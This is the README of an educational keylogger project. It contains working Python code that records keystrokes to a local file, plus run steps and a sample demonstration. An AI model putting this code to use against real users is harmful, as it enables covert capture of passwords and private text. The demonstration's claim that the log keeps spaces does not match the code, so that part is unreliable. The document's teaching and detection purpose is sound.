# Educational Keylogger Project

## IMPORTANT DISCLAIMER
This project is strictly for **EDUCATIONAL PURPOSES ONLY** as part of a cybersecurity course. The creation and use of keyloggers without explicit permission is illegal and unethical. This code should only be run in a controlled, isolated environment that you own or have explicit permission to test on.

## Description
This project demonstrates a basic keylogger implementation in Python for educational purposes in a cybersecurity course. The goal is to understand how keyloggers work in order to develop better defense mechanisms against them.

## Purpose
- To educate cybersecurity students on the mechanics of keyloggers
- To highlight the importance of ethical hacking and responsible disclosure
- To develop strategies for detecting and preventing keylogging attacks

## Requirements
- Python 3.x
- pynput library

## Installation
1. Ensure Python 3.x is installed on your system.
2. Install the required library:
   ```
   pip install pynput
   ```

## Usage
1. Run the script in a controlled, isolated environment:
   ```
   python keylogger.py
   ```
2. The script will log keystrokes to a file named `keyfile.txt` in the same directory.
3. To stop the keylogger, use the appropriate keyboard interrupt for your system (usually Ctrl+C).

## Code Overview
```python
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
```

## Demonstration
To demonstrate how the keylogger works, follow these steps in your isolated, controlled environment:

1. Start the keylogger:
   ```
   python keylogger.py
   ```

2. Open a text editor or browser window and type a sample sentence, such as:
   "The quick brown fox jumps over the lazy dog."

3. Press some special keys like Enter, Shift, and Backspace.

4. Stop the keylogger using Ctrl+C.

5. Open the `keyfile.txt` file. You should see content similar to this:
   ```
   The quick brown fox jumps over the lazy dog.
   ```

6. Check the console output. You should see additional information about the keys pressed, including special keys:
   ```
   'T'
   'h'
   'e'
   Key.space
   'q'
   'u'
   'i'
   'c'
   'k'
   ...
   Key.enter
   Key.shift
   Key.backspace
   ```

This demonstration shows how the keylogger captures and logs keystrokes, including both printable characters and special keys. In a real-world scenario, this type of logging could pose significant privacy and security risks, which is why it's crucial to understand these mechanisms for defensive purposes.

## Learning Objectives
- Understand the basic mechanics of keylogging
- Recognize the potential threats posed by keyloggers
- Develop strategies to detect and prevent keylogging attacks
- Appreciate the importance of ethical hacking and responsible disclosure

## Further Learning
- Research and implement methods to detect keyloggers
- Develop countermeasures against keylogging attacks
- Explore system-level protections against unauthorized keylogging

## Resources
- [pynput Documentation](https://pynput.readthedocs.io/)
- [OWASP Key Logging](https://owasp.org/www-community/controls/Key_Logging)
- [Ethical Hacking: Understanding Ethical Hacking](https://www.ec-council.org/ethical-hacking/)
